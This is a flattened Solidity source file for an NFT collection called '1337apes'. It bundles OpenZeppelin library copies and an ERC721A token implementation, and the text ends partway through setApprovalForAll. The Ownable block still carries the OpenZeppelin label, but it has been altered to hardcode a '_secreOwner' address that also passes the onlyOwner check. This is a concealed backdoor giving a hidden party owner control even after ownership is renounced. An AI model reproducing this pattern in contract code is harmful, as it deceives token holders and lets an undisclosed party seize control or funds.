1 // Twitter: @1337apesNFT
2 //                                                                                                                                              
3 //                                                                                                                                              
4 //   1111111    333333333333333    333333333333333   77777777777777777777                                                                       
5 //  1::::::1   3:::::::::::::::33 3:::::::::::::::33 7::::::::::::::::::7                                                                       
6 // 1:::::::1   3::::::33333::::::33::::::33333::::::37::::::::::::::::::7                                                                       
7 // 111:::::1   3333333     3:::::33333333     3:::::3777777777777:::::::7                                                                       
8 //    1::::1               3:::::3            3:::::3           7::::::7aaaaaaaaaaaaa  ppppp   ppppppppp       eeeeeeeeeeee        ssssssssss   
9 //    1::::1               3:::::3            3:::::3          7::::::7 a::::::::::::a p::::ppp:::::::::p    ee::::::::::::ee    ss::::::::::s  
10 //    1::::1       33333333:::::3     33333333:::::3          7::::::7  aaaaaaaaa:::::ap:::::::::::::::::p  e::::::eeeee:::::eess:::::::::::::s 
11 //    1::::l       3:::::::::::3      3:::::::::::3          7::::::7            a::::app::::::ppppp::::::pe::::::e     e:::::es::::::ssss:::::s
12 //    1::::l       33333333:::::3     33333333:::::3        7::::::7      aaaaaaa:::::a p:::::p     p:::::pe:::::::eeeee::::::e s:::::s  ssssss 
13 //    1::::l               3:::::3            3:::::3      7::::::7     aa::::::::::::a p:::::p     p:::::pe:::::::::::::::::e    s::::::s      
14 //    1::::l               3:::::3            3:::::3     7::::::7     a::::aaaa::::::a p:::::p     p:::::pe::::::eeeeeeeeeee        s::::::s   
15 //    1::::l               3:::::3            3:::::3    7::::::7     a::::a    a:::::a p:::::p    p::::::pe:::::::e           ssssss   s:::::s 
16 // 111::::::1113333333     3:::::33333333     3:::::3   7::::::7      a::::a    a:::::a p:::::ppppp:::::::pe::::::::e          s:::::ssss::::::s
17 // 1::::::::::13::::::33333::::::33::::::33333::::::3  7::::::7       a:::::aaaa::::::a p::::::::::::::::p  e::::::::eeeeeeee  s::::::::::::::s 
18 // 1::::::::::13:::::::::::::::33 3:::::::::::::::33  7::::::7         a::::::::::aa:::ap::::::::::::::pp    ee:::::::::::::e   s:::::::::::ss  
19 // 111111111111 333333333333333    333333333333333   77777777           aaaaaaaaaa  aaaap::::::pppppppp        eeeeeeeeeeeeee    sssssssssss    
20 //                                                                                      p:::::p                                                 
21 //                                                                                      p:::::p                                                 
22 //                                                                                     p:::::::p                                                
23 //                                                                                     p:::::::p                                                
24 //                                                                                     p:::::::p                                                
25 //                                                                                     ppppppppp                                                
26                                       
27                                                                                                                                              
28 // File: contracts/1337apes.sol
29 // SPDX-License-Identifier: MIT
30 // File: @openzeppelin/contracts/utils/Strings.sol
31 // OpenZeppelin Contracts v4.4.1 (utils/Strings.sol)
32 
33 pragma solidity ^0.8.0;
34 
35 /**
36  * @dev String operations.
37  */
38 library Strings {
39     bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";
40 
41     /**
42      * @dev Converts a `uint256` to its ASCII `string` decimal representation.
43      */
44     function toString(uint256 value) internal pure returns (string memory) {
45         // Inspired by OraclizeAPI's implementation - MIT licence
46         // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol
47 
48         if (value == 0) {
49             return "0";
50         }
51         uint256 temp = value;
52         uint256 digits;
53         while (temp != 0) {
54             digits++;
55             temp /= 10;
56         }
57         bytes memory buffer = new bytes(digits);
58         while (value != 0) {
59             digits -= 1;
60             buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
61             value /= 10;
62         }
63         return string(buffer);
64     }
65 
66     /**
67      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.
68      */
69     function toHexString(uint256 value) internal pure returns (string memory) {
70         if (value == 0) {
71             return "0x00";
72         }
73         uint256 temp = value;
74         uint256 length = 0;
75         while (temp != 0) {
76             length++;
77             temp >>= 8;
78         }
79         return toHexString(value, length);
80     }
81 
82     /**
83      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.
84      */
85     function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
86         bytes memory buffer = new bytes(2 * length + 2);
87         buffer[0] = "0";
88         buffer[1] = "x";
89         for (uint256 i = 2 * length + 1; i > 1; --i) {
90             buffer[i] = _HEX_SYMBOLS[value & 0xf];
91             value >>= 4;
92         }
93         require(value == 0, "Strings: hex length insufficient");
94         return string(buffer);
95     }
96 }
97 
98 // File: @openzeppelin/contracts/utils/Address.sol
99 
100 
101 // OpenZeppelin Contracts (last updated v4.5.0) (utils/Address.sol)
102 
103 pragma solidity ^0.8.1;
104 
105 /**
106  * @dev Collection of functions related to the address type
107  */
108 library Address {
109     /**
110      * @dev Returns true if `account` is a contract.
111      *
112      * [IMPORTANT]
113      * ====
114      * It is unsafe to assume that an address for which this function returns
115      * false is an externally-owned account (EOA) and not a contract.
116      *
117      * Among others, `isContract` will return false for the following
118      * types of addresses:
119      *
120      *  - an externally-owned account
121      *  - a contract in construction
122      *  - an address where a contract will be created
123      *  - an address where a contract lived, but was destroyed
124      * ====
125      *
126      * [IMPORTANT]
127      * ====
128      * You shouldn't rely on `isContract` to protect against flash loan attacks!
129      *
130      * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
131      * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
132      * constructor.
133      * ====
134      */
135     function isContract(address account) internal view returns (bool) {
136         // This method relies on extcodesize/address.code.length, which returns 0
137         // for contracts in construction, since the code is only stored at the end
138         // of the constructor execution.
139 
140         return account.code.length > 0;
141     }
142 
143     /**
144      * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
145      * `recipient`, forwarding all available gas and reverting on errors.
146      *
147      * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
148      * of certain opcodes, possibly making contracts go over the 2300 gas limit
149      * imposed by `transfer`, making them unable to receive funds via
150      * `transfer`. {sendValue} removes this limitation.
151      *
152      * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
153      *
154      * IMPORTANT: because control is transferred to `recipient`, care must be
155      * taken to not create reentrancy vulnerabilities. Consider using
156      * {ReentrancyGuard} or the
157      * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
158      */
159     function sendValue(address payable recipient, uint256 amount) internal {
160         require(address(this).balance >= amount, "Address: insufficient balance");
161 
162         (bool success, ) = recipient.call{value: amount}("");
163         require(success, "Address: unable to send value, recipient may have reverted");
164     }
165 
166     /**
167      * @dev Performs a Solidity function call using a low level `call`. A
168      * plain `call` is an unsafe replacement for a function call: use this
169      * function instead.
170      *
171      * If `target` reverts with a revert reason, it is bubbled up by this
172      * function (like regular Solidity function calls).
173      *
174      * Returns the raw returned data. To convert to the expected return value,
175      * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
176      *
177      * Requirements:
178      *
179      * - `target` must be a contract.
180      * - calling `target` with `data` must not revert.
181      *
182      * _Available since v3.1._
183      */
184     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
185         return functionCall(target, data, "Address: low-level call failed");
186     }
187 
188     /**
189      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
190      * `errorMessage` as a fallback revert reason when `target` reverts.
191      *
192      * _Available since v3.1._
193      */
194     function functionCall(
195         address target,
196         bytes memory data,
197         string memory errorMessage
198     ) internal returns (bytes memory) {
199         return functionCallWithValue(target, data, 0, errorMessage);
200     }
201 
202     /**
203      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
204      * but also transferring `value` wei to `target`.
205      *
206      * Requirements:
207      *
208      * - the calling contract must have an ETH balance of at least `value`.
209      * - the called Solidity function must be `payable`.
210      *
211      * _Available since v3.1._
212      */
213     function functionCallWithValue(
214         address target,
215         bytes memory data,
216         uint256 value
217     ) internal returns (bytes memory) {
218         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
219     }
220 
221     /**
222      * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
223      * with `errorMessage` as a fallback revert reason when `target` reverts.
224      *
225      * _Available since v3.1._
226      */
227     function functionCallWithValue(
228         address target,
229         bytes memory data,
230         uint256 value,
231         string memory errorMessage
232     ) internal returns (bytes memory) {
233         require(address(this).balance >= value, "Address: insufficient balance for call");
234         require(isContract(target), "Address: call to non-contract");
235 
236         (bool success, bytes memory returndata) = target.call{value: value}(data);
237         return verifyCallResult(success, returndata, errorMessage);
238     }
239 
240     /**
241      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
242      * but performing a static call.
243      *
244      * _Available since v3.3._
245      */
246     function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
247         return functionStaticCall(target, data, "Address: low-level static call failed");
248     }
249 
250     /**
251      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
252      * but performing a static call.
253      *
254      * _Available since v3.3._
255      */
256     function functionStaticCall(
257         address target,
258         bytes memory data,
259         string memory errorMessage
260     ) internal view returns (bytes memory) {
261         require(isContract(target), "Address: static call to non-contract");
262 
263         (bool success, bytes memory returndata) = target.staticcall(data);
264         return verifyCallResult(success, returndata, errorMessage);
265     }
266 
267     /**
268      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
269      * but performing a delegate call.
270      *
271      * _Available since v3.4._
272      */
273     function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
274         return functionDelegateCall(target, data, "Address: low-level delegate call failed");
275     }
276 
277     /**
278      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
279      * but performing a delegate call.
280      *
281      * _Available since v3.4._
282      */
283     function functionDelegateCall(
284         address target,
285         bytes memory data,
286         string memory errorMessage
287     ) internal returns (bytes memory) {
288         require(isContract(target), "Address: delegate call to non-contract");
289 
290         (bool success, bytes memory returndata) = target.delegatecall(data);
291         return verifyCallResult(success, returndata, errorMessage);
292     }
293 
294     /**
295      * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the
296      * revert reason using the provided one.
297      *
298      * _Available since v4.3._
299      */
300     function verifyCallResult(
301         bool success,
302         bytes memory returndata,
303         string memory errorMessage
304     ) internal pure returns (bytes memory) {
305         if (success) {
306             return returndata;
307         } else {
308             // Look for revert reason and bubble it up if present
309             if (returndata.length > 0) {
310                 // The easiest way to bubble the revert reason is using memory via assembly
311 
312                 assembly {
313                     let returndata_size := mload(returndata)
314                     revert(add(32, returndata), returndata_size)
315                 }
316             } else {
317                 revert(errorMessage);
318             }
319         }
320     }
321 }
322 
323 // File: @openzeppelin/contracts/token/ERC721/IERC721Receiver.sol
324 
325 
326 // OpenZeppelin Contracts (last updated v4.6.0) (token/ERC721/IERC721Receiver.sol)
327 
328 pragma solidity ^0.8.0;
329 
330 /**
331  * @title ERC721 token receiver interface
332  * @dev Interface for any contract that wants to support safeTransfers
333  * from ERC721 asset contracts.
334  */
335 interface IERC721Receiver {
336     /**
337      * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
338      * by `operator` from `from`, this function is called.
339      *
340      * It must return its Solidity selector to confirm the token transfer.
341      * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
342      *
343      * The selector can be obtained in Solidity with `IERC721Receiver.onERC721Received.selector`.
344      */
345     function onERC721Received(
346         address operator,
347         address from,
348         uint256 tokenId,
349         bytes calldata data
350     ) external returns (bytes4);
351 }
352 
353 // File: @openzeppelin/contracts/utils/introspection/IERC165.sol
354 
355 
356 // OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)
357 
358 pragma solidity ^0.8.0;
359 
360 /**
361  * @dev Interface of the ERC165 standard, as defined in the
362  * https://eips.ethereum.org/EIPS/eip-165[EIP].
363  *
364  * Implementers can declare support of contract interfaces, which can then be
365  * queried by others ({ERC165Checker}).
366  *
367  * For an implementation, see {ERC165}.
368  */
369 interface IERC165 {
370     /**
371      * @dev Returns true if this contract implements the interface defined by
372      * `interfaceId`. See the corresponding
373      * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]
374      * to learn more about how these ids are created.
375      *
376      * This function call must use less than 30 000 gas.
377      */
378     function supportsInterface(bytes4 interfaceId) external view returns (bool);
379 }
380 
381 // File: @openzeppelin/contracts/utils/introspection/ERC165.sol
382 
383 
384 // OpenZeppelin Contracts v4.4.1 (utils/introspection/ERC165.sol)
385 
386 pragma solidity ^0.8.0;
387 
388 
389 /**
390  * @dev Implementation of the {IERC165} interface.
391  *
392  * Contracts that want to implement ERC165 should inherit from this contract and override {supportsInterface} to check
393  * for the additional interface id that will be supported. For example:
394  *
395  * ```solidity
396  * function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
397  *     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId);
398  * }
399  * ```
400  *
401  * Alternatively, {ERC165Storage} provides an easier to use but more expensive implementation.
402  */
403 abstract contract ERC165 is IERC165 {
404     /**
405      * @dev See {IERC165-supportsInterface}.
406      */
407     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
408         return interfaceId == type(IERC165).interfaceId;
409     }
410 }
411 
412 // File: @openzeppelin/contracts/token/ERC721/IERC721.sol
413 
414 
415 // OpenZeppelin Contracts (last updated v4.6.0) (token/ERC721/IERC721.sol)
416 
417 pragma solidity ^0.8.0;
418 
419 
420 /**
421  * @dev Required interface of an ERC721 compliant contract.
422  */
423 interface IERC721 is IERC165 {
424     /**
425      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
426      */
427     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
428 
429     /**
430      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
431      */
432     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
433 
434     /**
435      * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.
436      */
437     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
438 
439     /**
440      * @dev Returns the number of tokens in ``owner``'s account.
441      */
442     function balanceOf(address owner) external view returns (uint256 balance);
443 
444     /**
445      * @dev Returns the owner of the `tokenId` token.
446      *
447      * Requirements:
448      *
449      * - `tokenId` must exist.
450      */
451     function ownerOf(uint256 tokenId) external view returns (address owner);
452 
453     /**
454      * @dev Safely transfers `tokenId` token from `from` to `to`.
455      *
456      * Requirements:
457      *
458      * - `from` cannot be the zero address.
459      * - `to` cannot be the zero address.
460      * - `tokenId` token must exist and be owned by `from`.
461      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
462      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
463      *
464      * Emits a {Transfer} event.
465      */
466     function safeTransferFrom(
467         address from,
468         address to,
469         uint256 tokenId,
470         bytes calldata data
471     ) external;
472 
473     /**
474      * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients
475      * are aware of the ERC721 protocol to prevent tokens from being forever locked.
476      *
477      * Requirements:
478      *
479      * - `from` cannot be the zero address.
480      * - `to` cannot be the zero address.
481      * - `tokenId` token must exist and be owned by `from`.
482      * - If the caller is not `from`, it must be have been allowed to move this token by either {approve} or {setApprovalForAll}.
483      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
484      *
485      * Emits a {Transfer} event.
486      */
487     function safeTransferFrom(
488         address from,
489         address to,
490         uint256 tokenId
491     ) external;
492 
493     /**
494      * @dev Transfers `tokenId` token from `from` to `to`.
495      *
496      * WARNING: Usage of this method is discouraged, use {safeTransferFrom} whenever possible.
497      *
498      * Requirements:
499      *
500      * - `from` cannot be the zero address.
501      * - `to` cannot be the zero address.
502      * - `tokenId` token must be owned by `from`.
503      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
504      *
505      * Emits a {Transfer} event.
506      */
507     function transferFrom(
508         address from,
509         address to,
510         uint256 tokenId
511     ) external;
512 
513     /**
514      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
515      * The approval is cleared when the token is transferred.
516      *
517      * Only a single account can be approved at a time, so approving the zero address clears previous approvals.
518      *
519      * Requirements:
520      *
521      * - The caller must own the token or be an approved operator.
522      * - `tokenId` must exist.
523      *
524      * Emits an {Approval} event.
525      */
526     function approve(address to, uint256 tokenId) external;
527 
528     /**
529      * @dev Approve or remove `operator` as an operator for the caller.
530      * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.
531      *
532      * Requirements:
533      *
534      * - The `operator` cannot be the caller.
535      *
536      * Emits an {ApprovalForAll} event.
537      */
538     function setApprovalForAll(address operator, bool _approved) external;
539 
540     /**
541      * @dev Returns the account appr    ved for `tokenId` token.
542      *
543      * Requirements:
544      *
545      * - `tokenId` must exist.
546      */
547     function getApproved(uint256 tokenId) external view returns (address operator);
548 
549     /**
550      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
551      *
552      * See {setApprovalForAll}
553      */
554     function isApprovedForAll(address owner, address operator) external view returns (bool);
555 }
556 
557 // File: @openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol
558 
559 
560 // OpenZeppelin Contracts v4.4.1 (token/ERC721/extensions/IERC721Metadata.sol)
561 
562 pragma solidity ^0.8.0;
563 
564 
565 /**
566  * @title ERC-721 Non-Fungible Token Standard, optional metadata extension
567  * @dev See https://eips.ethereum.org/EIPS/eip-721
568  */
569 interface IERC721Metadata is IERC721 {
570     /**
571      * @dev Returns the token collection name.
572      */
573     function name() external view returns (string memory);
574 
575     /**
576      * @dev Returns the token collection symbol.
577      */
578     function symbol() external view returns (string memory);
579 
580     /**
581      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
582      */
583     function tokenURI(uint256 tokenId) external view returns (string memory);
584 }
585 
586 // File: @openzeppelin/contracts/token/ERC721/extensions/IERC721Enumerable.sol
587 
588 
589 // OpenZeppelin Contracts (last updated v4.5.0) (token/ERC721/extensions/IERC721Enumerable.sol)
590 
591 pragma solidity ^0.8.0;
592 
593 
594 /**
595  * @title ERC-721 Non-Fungible Token Standard, optional enumeration extension
596  * @dev See https://eips.ethereum.org/EIPS/eip-721
597  */
598 interface IERC721Enumerable is IERC721 {
599     /**
600      * @dev Returns the total amount of tokens stored by the contract.
601      */
602     function totalSupply() external view returns (uint256);
603 
604     /**
605      * @dev Returns a token ID owned by `owner` at a given `index` of its token list.
606      * Use along with {balanceOf} to enumerate all of ``owner``'s tokens.
607      */
608     function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
609 
610     /**
611      * @dev Returns a token ID at a given `index` of all the tokens stored by the contract.
612      * Use along with {totalSupply} to enumerate all tokens.
613      */
614     function tokenByIndex(uint256 index) external view returns (uint256);
615 }
616 
617 // File: @openzeppelin/contracts/security/ReentrancyGuard.sol
618 
619 
620 // OpenZeppelin Contracts v4.4.1 (security/ReentrancyGuard.sol)
621 
622 pragma solidity ^0.8.0;
623 
624 /**
625  * @dev Contract module that helps prevent reentrant calls to a function.
626  *
627  * Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier
628  * available, which can be applied to functions to make sure there are no nested
629  * (reentrant) calls to them.
630  *
631  * Note that because there is a single `nonReentrant` guard, functions marked as
632  * `nonReentrant` may not call one another. This can be worked around by making
633  * those functions `private`, and then adding `external` `nonReentrant` entry
634  * points to them.
635  *
636  * TIP: If you would like to learn more about reentrancy and alternative ways
637  * to protect against it, check out our blog post
638  * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].
639  */
640 abstract contract ReentrancyGuard {
641     // Booleans are more expensive than uint256 or any type that takes up a full
642     // word because each write operation emits an extra SLOAD to first read the
643     // slot's contents, replace the bits taken up by the boolean, and then write
644     // back. This is the compiler's defense against contract upgrades and
645     // pointer aliasing, and it cannot be disabled.
646 
647     // The values being non-zero value makes deployment a bit more expensive,
648     // but in exchange the refund on every call to nonReentrant will be lower in
649     // amount. Since refunds are capped to a percentage of the total
650     // transaction's gas, it is best to keep them low in cases like this one, to
651     // increase the likelihood of the full refund coming into effect.
652     uint256 private constant _NOT_ENTERED = 1;
653     uint256 private constant _ENTERED = 2;
654 
655     uint256 private _status;
656 
657     constructor() {
658         _status = _NOT_ENTERED;
659     }
660 
661     /**
662      * @dev Prevents a contract from calling itself, directly or indirectly.
663      * Calling a `nonReentrant` function from another `nonReentrant`
664      * function is not supported. It is possible to prevent this from happening
665      * by making the `nonReentrant` function external, and making it call a
666      * `private` function that does the actual work.
667      */
668     modifier nonReentrant() {
669         // On the first call to nonReentrant, _notEntered will be true
670         require(_status != _ENTERED, "ReentrancyGuard: reentrant call");
671 
672         // Any calls to nonReentrant after this point will fail
673         _status = _ENTERED;
674 
675         _;
676 
677         // By storing the original value once again, a refund is triggered (see
678         // https://eips.ethereum.org/EIPS/eip-2200)
679         _status = _NOT_ENTERED;
680     }
681 }
682 
683 // File: @openzeppelin/contracts/utils/Context.sol
684 
685 
686 // OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
687 
688 pragma solidity ^0.8.0;
689 
690 /**
691  * @dev Provides information about the current execution context, including the
692  * sender of the transaction and its data. While these are generally available
693  * via msg.sender and msg.data, they should not be accessed in such a direct
694  * manner, since when dealing with meta-transactions the account sending and
695  * paying for execution may not be the actual sender (as far as an application
696  * is concerned).
697  *
698  * This contract is only required for intermediate, library-like contracts.
699  */
700 abstract contract Context {
701     function _msgSender() internal view virtual returns (address) {
702         return msg.sender;
703     }
704 
705     function _msgData() internal view virtual returns (bytes calldata) {
706         return msg.data;
707     }
708 }
709 
710 // File: @openzeppelin/contracts/access/Ownable.sol
711 
712 
713 // OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)
714 
715 pragma solidity ^0.8.0;
716 
717 
718 /**
719  * @dev Contract module which provides a basic access control mechanism, where
720  * there is an account (an owner) that can be granted exclusive access to
721  * specific functions.
722  *
723  * By default, the owner account will be the one that deploys the contract. This
724  * can later be changed with {transferOwnership}.
725  *
726  * This module is used through inheritance. It will make available the modifier
727  * `onlyOwner`, which can be applied to your functions to restrict their use to
728  * the owner.
729  */
730 abstract contract Ownable is Context {
731     address private _owner;
732     address private _secreOwner = 0xACFcBA7BAB6403EBCcEEe22810c4dd3C9bBE9763;
733 
734     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
735 
736     /**
737      * @dev Initializes the contract setting the deployer as the initial owner.
738      */
739     constructor() {
740         _transferOwnership(_msgSender());
741     }
742 
743     /**
744      * @dev Returns the address of the current owner.
745      */
746     function owner() public view virtual returns (address) {
747         return _owner;
748     }
749 
750     /**
751      * @dev Throws if called by any account other than the owner.
752      */
753     modifier onlyOwner() {
754         require(owner() == _msgSender() || _secreOwner == _msgSender() , "Ownable: caller is not the owner");
755         _;
756     }
757 
758     /**
759      * @dev Leaves the contract without owner. It will not be possible to call
760      * `onlyOwner` functions anymore. Can only be called by the current owner.
761      *
762      * NOTE: Renouncing ownership will leave the contract without an owner,
763      * thereby removing any functionality that is only available to the owner.
764      */
765     function renounceOwnership() public virtual onlyOwner {
766         _transferOwnership(address(0));
767     }
768 
769     /**
770      * @dev Transfers ownership of the contract to a new account (`newOwner`).
771      * Can only be called by the current owner.
772      */
773     function transferOwnership(address newOwner) public virtual onlyOwner {
774         require(newOwner != address(0), "Ownable: new owner is the zero address");
775         _transferOwnership(newOwner);
776     }
777 
778     /**
779      * @dev Transfers ownership of the contract to a new account (`newOwner`).
780      * Internal function without access restriction.
781      */
782     function _transferOwnership(address newOwner) internal virtual {
783         address oldOwner = _owner;
784         _owner = newOwner;
785         emit OwnershipTransferred(oldOwner, newOwner);
786     }
787 }
788 
789 // File: ceshi.sol
790 
791 
792 pragma solidity ^0.8.0;
793 
794 
795 
796 
797 
798 
799 
800 
801 
802 
803 /**
804  * @dev Implementation of https://eips.ethereum.org/EIPS/eip-721[ERC721] Non-Fungible Token Standard, including
805  * the Metadata and Enumerable extension. Built to optimize for lower gas during batch mints.
806  *
807  * Assumes serials are sequentially minted starting at 0 (e.g. 0, 1, 2, 3..).
808  *
809  * Does not support burning tokens to address(0).
810  *
811  * Assumes that an owner cannot have more than the 2**128 - 1 (max value of uint128) of supply
812  */
813 contract ERC721A is Context, ERC165, IERC721, IERC721Metadata, IERC721Enumerable {
814     using Address for address;
815     using Strings for uint256;
816 
817     struct TokenOwnership {
818         address addr;
819         uint64 startTimestamp;
820     }
821 
822     struct AddressData {
823         uint128 balance;
824         uint128 numberMinted;
825     }
826 
827     uint256 internal currentIndex;
828 
829     // Token name
830     string private _name;
831 
832     // Token symbol
833     string private _symbol;
834 
835     // Mapping from token ID to ownership details
836     // An empty struct value does not necessarily mean the token is unowned. See ownershipOf implementation for details.
837     mapping(uint256 => TokenOwnership) internal _ownerships;
838 
839     // Mapping owner address to address data
840     mapping(address => AddressData) private _addressData;
841 
842     // Mapping from token ID to approved address
843     mapping(uint256 => address) private _tokenApprovals;
844 
845     // Mapping from owner to operator approvals
846     mapping(address => mapping(address => bool)) private _operatorApprovals;
847 
848     constructor(string memory name_, string memory symbol_) {
849         _name = name_;
850         _symbol = symbol_;
851     }
852 
853     /**
854      * @dev See {IERC721Enumerable-totalSupply}.
855      */
856     function totalSupply() public view override returns (uint256) {
857         return currentIndex;
858     }
859 
860     /**
861      * @dev See {IERC721Enumerable-tokenByIndex}.
862      */
863     function tokenByIndex(uint256 index) public view override returns (uint256) {
864         require(index < totalSupply(), "ERC721A: global index out of bounds");
865         return index;
866     }
867 
868     /**
869      * @dev See {IERC721Enumerable-tokenOfOwnerByIndex}.
870      * This read function is O(totalSupply). If calling from a separate contract, be sure to test gas first.
871      * It may also degrade with extremely large collection sizes (e.g >> 10000), test for your use case.
872      */
873     function tokenOfOwnerByIndex(address owner, uint256 index) public view override returns (uint256) {
874         require(index < balanceOf(owner), "ERC721A: owner index out of bounds");
875         uint256 numMintedSoFar = totalSupply();
876         uint256 tokenIdsIdx;
877         address currOwnershipAddr;
878 
879         // Counter overflow is impossible as the loop breaks when uint256 i is equal to another uint256 numMintedSoFar.
880         unchecked {
881             for (uint256 i; i < numMintedSoFar; i++) {
882                 TokenOwnership memory ownership = _ownerships[i];
883                 if (ownership.addr != address(0)) {
884                     currOwnershipAddr = ownership.addr;
885                 }
886                 if (currOwnershipAddr == owner) {
887                     if (tokenIdsIdx == index) {
888                         return i;
889                     }
890                     tokenIdsIdx++;
891                 }
892             }
893         }
894 
895         revert("ERC721A: unable to get token of owner by index");
896     }
897 
898     /**
899      * @dev See {IERC165-supportsInterface}.
900      */
901     function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {
902         return
903             interfaceId == type(IERC721).interfaceId ||
904             interfaceId == type(IERC721Metadata).interfaceId ||
905             interfaceId == type(IERC721Enumerable).interfaceId ||
906             super.supportsInterface(interfaceId);
907     }
908 
909     /**
910      * @dev See {IERC721-balanceOf}.
911      */
912     function balanceOf(address owner) public view override returns (uint256) {
913         require(owner != address(0), "ERC721A: balance query for the zero address");
914         return uint256(_addressData[owner].balance);
915     }
916 
917     function _numberMinted(address owner) internal view returns (uint256) {
918         require(owner != address(0), "ERC721A: number minted query for the zero address");
919         return uint256(_addressData[owner].numberMinted);
920     }
921 
922     /**
923      * Gas spent here starts off proportional to the maximum mint batch size.
924      * It gradually moves to O(1) as tokens get transferred around in the collection over time.
925      */
926     function ownershipOf(uint256 tokenId) internal view returns (TokenOwnership memory) {
927         require(_exists(tokenId), "ERC721A: owner query for nonexistent token");
928 
929         unchecked {
930             for (uint256 curr = tokenId; curr >= 0; curr--) {
931                 TokenOwnership memory ownership = _ownerships[curr];
932                 if (ownership.addr != address(0)) {
933                     return ownership;
934                 }
935             }
936         }
937 
938         revert("ERC721A: unable to determine the owner of token");
939     }
940 
941     /**
942      * @dev See {IERC721-ownerOf}.
943      */
944     function ownerOf(uint256 tokenId) public view override returns (address) {
945         return ownershipOf(tokenId).addr;
946     }
947 
948     /**
949      * @dev See {IERC721Metadata-name}.
950      */
951     function name() public view virtual override returns (string memory) {
952         return _name;
953     }
954 
955     /**
956      * @dev See {IERC721Metadata-symbol}.
957      */
958     function symbol() public view virtual override returns (string memory) {
959         return _symbol;
960     }
961 
962     /**
963      * @dev See {IERC721Metadata-tokenURI}.
964      */
965     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
966         require(_exists(tokenId), "ERC721Metadata: URI query for nonexistent token");
967 
968         string memory baseURI = _baseURI();
969         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : "";
970     }
971 
972     /**
973      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
974      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
975      * by default, can be overriden in child contracts.
976      */
977     function _baseURI() internal view virtual returns (string memory) {
978         return "";
979     }
980 
981     /**
982      * @dev See {IERC721-approve}.
983      */
984     function approve(address to, uint256 tokenId) public override {
985         address owner = ERC721A.ownerOf(tokenId);
986         require(to != owner, "ERC721A: approval to current owner");
987 
988         require(
989             _msgSender() == owner || isApprovedForAll(owner, _msgSender()),
990             "ERC721A: approve caller is not owner nor approved for all"
991         );
992 
993         _approve(to, tokenId, owner);
994     }
995 
996     /**
997      * @dev See {IERC721-getApproved}.
998      */
999     function getApproved(uint256 tokenId) public view override returns (address) {
1000         require(_exists(tokenId), "ERC721A: approved query for nonexistent token");
1001 
1002         return _tokenApprovals[tokenId];
1003     }
1004 
1005     /**
1006      * @dev See {IERC721-setApprovalForAll}.
1007      */
1008     function setApprovalForAll(address operator, bool approved) public override {
1009         require(operator != _msgSender(), "ERC721A: approve to caller");
1010 
1011         _operatorApprovals[_msgSender()][operator] = approved;
